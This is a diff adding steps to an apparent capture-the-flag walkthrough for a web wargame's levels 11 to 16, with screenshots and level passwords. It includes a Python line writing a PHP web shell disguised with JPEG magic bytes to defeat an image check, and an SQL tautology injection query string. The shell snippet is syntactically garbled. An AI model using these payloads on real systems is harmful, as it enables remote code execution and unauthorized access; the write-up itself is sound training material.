@@ -111,6 +111,60 @@
 ![image](https://user-images.githubusercontent.com/60177793/92504135-d9310d80-f21f-11ea-92cd-08a3e400d929.png)
 ###### pass: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
 
+###### level 11- > level 12
+![image](https://user-images.githubusercontent.com/60177793/93710026-d52ab700-fb60-11ea-8dd0-cb5fb261a847.png)
+###### pass: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+###### level 12 ->  level 13
+
+![image](https://user-images.githubusercontent.com/60177793/93710534-48cec300-fb65-11ea-998e-c8b177301ad9.png)
+![image](https://user-images.githubusercontent.com/60177793/93710565-6e5bcc80-fb65-11ea-860c-06da62d83fbf.png)
+after uploading the php file :
+![image](https://user-images.githubusercontent.com/60177793/93710586-80d60600-fb65-11ea-9e43-97ef3a7aaea7.png)
+this level was all about file upload remote code execution
+Now we know that it is accepting php file so to get the password for the next level , we need to change the file extension to php in the source code and then again upload our php file:
+![image](https://user-images.githubusercontent.com/60177793/93710829-0b6b3500-fb67-11ea-9b93-ec054dd1cdd5.png)
+
+Now it is getting uploaded with the php extension
+![image](https://user-images.githubusercontent.com/60177793/93710797-d65ee280-fb66-11ea-94d0-65a758d7e3ba.png)
+
+click on the uploaded file to get the password:
+![image](https://user-images.githubusercontent.com/60177793/93710789-c941f380-fb66-11ea-80df-5bd3b0220fcb.png)
+# pass:  jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+
+# level 13-> 14
+
+##### This level is similar to 13, with the difference that the server side code now runs the function exif_imagetype on the uploaded file to check if it’s really an image.
+
+##### exif_imagetype works by reading the first few bytes from a file to check if they match what the first few bytes of a jpeg, gif, png etc file are meant to be. We can therefore trick the function by supplying a file which starts with the first few bytes of an image format. For example, jpeg files start with the number 0xFFD8FFE0. We can create a php script with the correct starting bytes with the following python code:
+##### GIF89a
+##### shell=open('shell.php','wsshell.write('\xFF\xD8\xFF\xE0'<?php $output = shell_exec($_GET["cmd"]); echo "<pre>$output</pre>"; ?>')
+#####  shell.close()
+##### Uploading this file and changing the filename input extension to .php as before prints out the password.
+
+![image](https://user-images.githubusercontent.com/60177793/93711140-81709b80-fb69-11ea-933d-141bd5361438.png)
+![image](https://user-images.githubusercontent.com/60177793/93711236-3a36da80-fb6a-11ea-9891-af8fe1a164dd.png)
+![image](https://user-images.githubusercontent.com/60177793/93711388-728ae880-fb6b-11ea-8af8-df4a09d9da13.png)
+
+![image](https://user-images.githubusercontent.com/60177793/93711376-5b4bfb00-fb6b-11ea-8e2e-a1ea99b222de.png)
+# pass:   Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+
+# level 14-> level 15
+ 
+##### The statement:
+
+##### SELECT * from users where username="" or "1"="1" and password="" or "1"="1"
+##### Makes use of SQL tautologies to return rows.
+##### ?username=%22%20or%20%221%22=%221&password=%22%20or%20%221%22=%221&debug
+![image](https://user-images.githubusercontent.com/60177793/93711671-bda5fb00-fb6d-11ea-821c-b3f8cf674211.png)
+
+##### pass:  AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+
+# level 15-> level 16
+
+![image](https://user-images.githubusercontent.com/60177793/93711818-e7abed00-fb6e-11ea-9adf-f8f8b8b096b8.png)
+
+
+
 
 
 
